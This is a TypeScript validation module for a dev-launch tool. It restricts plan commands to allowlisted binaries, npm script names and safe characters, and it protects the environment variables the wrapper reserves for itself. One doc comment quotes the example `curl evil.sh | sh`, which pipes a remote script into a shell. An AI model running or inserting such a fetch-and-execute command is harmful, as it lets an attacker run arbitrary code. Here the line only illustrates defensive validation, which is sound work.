import { FailureCode } from '@devlaunch/shared';
import { SecurityRejection } from './ImageAllowlist.js';

/**
 * Binaries a Run Plan may invoke. Schema validation is not security: a plan carrying
 * `startCommand: "curl evil.sh | sh"` satisfies Zod perfectly.
 */
export const ALLOWED_BINARIES: readonly string[] = Object.freeze([
  'npm', 'yarn', 'pnpm', 'npx',
  'node',
  'python', 'python3', 'pip', 'pip3',
  'flask', 'gunicorn', 'uvicorn', 'django-admin',
  'next', 'vite',
]);

/**
 * Script names `npm run <name>` may target.
 *
 * Only the *name* is checked. The script body in package.json is deliberately not
 * inspected — real dev scripts chain commands (`tsc && vite build`), so rejecting
 * metacharacters there would reject most legitimate repositories while stopping
 * nothing the container does not already contain. The body is shown to the user
 * before execution instead. See docs/planning-strategy.md.
 */
export const ALLOWED_SCRIPT_NAMES: readonly string[] = Object.freeze([
  'dev', 'start', 'serve', 'preview', 'build',
]);

/**
 * Characters permitted in a plan's command fields.
 *
 * A whitelist, not a blacklist: enumerating dangerous characters invites the one you
 * forgot. This set covers every command the rule-based planner composes, including the
 * host-binding normalisations (`--host=0.0.0.0`, `0.0.0.0:8000`, `app:app`).
 */
const SAFE_COMMAND_PATTERN = /^[A-Za-z0-9 _\-./:=@,+]+$/;

/** Reported individually so the rejection message names the offending character. */
const METACHARACTER_NAMES: Record<string, string> = {
  ';': 'command separator',
  '|': 'pipe',
  '&': 'background/chain',
  '`': 'command substitution',
  $: 'variable/command substitution',
  '(': 'subshell',
  ')': 'subshell',
  '<': 'redirection',
  '>': 'redirection',
  '\n': 'newline',
  '\r': 'carriage return',
  '\\': 'escape',
  "'": 'quote',
  '"': 'quote',
  '*': 'glob',
  '?': 'glob',
};

export interface ValidatedCommand {
  /** The original string, safe to hand to the container wrapper. */
  raw: string;
  /** Whitespace-split tokens. Safe because no quoting or substitution survives validation. */
  argv: string[];
  binary: string;
}

export function validateCommand(command: string, field = 'command'): ValidatedCommand {
  const trimmed = command.trim();

  if (trimmed.length === 0) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `${field} is empty.`,
    );
  }

  if (trimmed.length > 512) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `${field} exceeds 512 characters.`,
    );
  }

  if (!SAFE_COMMAND_PATTERN.test(trimmed)) {
    const offender = [...trimmed].find((c) => !/[A-Za-z0-9 _\-./:=@,+]/.test(c))!;
    const label = METACHARACTER_NAMES[offender] ?? 'disallowed character';
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `${field} contains ${label} ${JSON.stringify(offender)}: ${JSON.stringify(command)}`,
    );
  }

  const argv = trimmed.split(/ +/);
  const binary = argv[0]!;

  if (!ALLOWED_BINARIES.includes(binary)) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `${field} invokes "${binary}", which is not an approved binary. ` +
        `Approved: ${ALLOWED_BINARIES.join(', ')}`,
    );
  }

  // `npm run <name>` is the one form where an argument selects arbitrary code, so the
  // script name is constrained even though its body is not.
  if (['npm', 'pnpm', 'yarn'].includes(binary) && argv[1] === 'run') {
    const script = argv[2];
    if (!script) {
      throw new SecurityRejection(
        FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
        `${field} is "${binary} run" with no script name.`,
      );
    }
    if (!ALLOWED_SCRIPT_NAMES.includes(script)) {
      throw new SecurityRejection(
        FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
        `${field} runs script "${script}", which is not approved. ` +
          `Approved: ${ALLOWED_SCRIPT_NAMES.join(', ')}`,
      );
    }
  }

  return { raw: trimmed, argv, binary };
}

export function validateOptionalCommand(
  command: string | null,
  field: string,
): ValidatedCommand | null {
  return command === null ? null : validateCommand(command, field);
}

/**
 * Prefix reserved for the wrapper's control variables.
 *
 * The wrapper reads its validated commands from $DL_START_CMD and friends. If a
 * plan-supplied variable could claim one of those names it would replace an
 * allowlisted command with arbitrary text, bypassing validation completely.
 */
export const RESERVED_ENV_PREFIX = 'DL_';

const ENV_KEY_PATTERN = /^[A-Za-z_][A-Za-z0-9_]*$/;

export function validateEnvVarKey(key: string): string {
  if (!ENV_KEY_PATTERN.test(key)) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `Environment variable name ${JSON.stringify(key)} is not a valid identifier.`,
    );
  }
  if (key.startsWith(RESERVED_ENV_PREFIX)) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `Environment variable ${JSON.stringify(key)} uses the reserved "${RESERVED_ENV_PREFIX}" ` +
        'prefix, which carries the wrapper\'s validated commands.',
    );
  }
  return key;
}

export function validateEnvVarValue(key: string, value: string): string {
  // Control characters would let one entry masquerade as several.
  if (/[\0\n\r]/.test(value)) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `Environment variable ${JSON.stringify(key)} contains a control character.`,
    );
  }
  return value;
}
